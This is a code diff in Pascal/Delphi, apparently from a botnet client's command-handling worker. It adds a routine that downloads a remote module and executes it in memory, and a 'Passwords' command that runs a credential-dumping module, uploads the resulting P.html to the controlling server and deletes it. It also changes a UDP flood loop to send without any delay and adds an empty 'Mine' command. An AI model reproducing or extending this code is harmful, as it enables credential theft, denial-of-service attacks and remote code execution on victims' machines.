@@ -17,6 +17,7 @@ type
     FCmdID: String;
     FIndex: LongInt;
     procedure DownloadFile(URL: String; var MS: TMemoryStream);
+    function ExecuteModule(URL, Params: String): Boolean;
   public
     property Identifier: String read FCmdID write FCmdID;
     constructor Create(CmdID: String; Index: LongInt);
@@ -44,6 +45,20 @@ Begin
   except
   end;
   MS.Position:=0;
+end;
+
+function TCmdWorker.ExecuteModule(URL, Params: String): Boolean;
+var
+  MS: TMemoryStream;
+Begin
+  Result:=True;
+  MS:=TMemoryStream.Create;
+  try
+    DownloadFile(URL, MS);
+    Result:=(ExecFromMem(FullName, Params, MS.Memory)<>0);
+  except
+    on E: Exception do Result:=False;
+  end;
 end;
 
 //General functions and Command Execution
@@ -297,18 +312,37 @@ Begin
         Settings.ReadInt64('Flood', 'Port', 80));
       SMessage:=Settings.ReadString('Flood', 'Message', 'A cat is fine too. Desudesudesu~');
       if Settings.ReadBool('Flood', 'MaxPower', True) then Begin
-      While Not(Terminated) do Begin
-        UP.Send(SMessage);
-        Sleep(1);
-      end;
+        While Not(Terminated) do Begin
+          UP.Send(SMessage);
+        end;
       end else Begin
+        While Not(Terminated) do Begin
+          UP.Send(SMessage);
+          Sleep(1);
+        end;
       end;
       UP.Free;
       ToPost.AddFormField('Result', 'Flood over!');
       DoPost;
     end;
-    'Ping': Begin
-
+    'Mine': Begin
+    end;
+    'Passwords': Begin
+      Error:=True; //Not feeling too positive today
+      if ExecuteModule(Server+PassModule, '/shtml P.html') then Begin
+        Sleep(2000);
+        if FileExists('P.html') then Begin
+          Error:=False;
+          ToPost.AddFormField('RT', '2');
+          ToPost.AddFile('File', 'P.html');
+        end;
+      end;
+      if Error then Begin
+        ToPost.AddFormField('RT', '1');
+        ToPost.AddFormField('Result', 'Failed to execute the password module.');
+      end;
+      DoPost;
+      if FileExists('P.html') then DeleteFile('P.html');
     end
     else Begin
       ToPost.AddFormField('RT', '1');
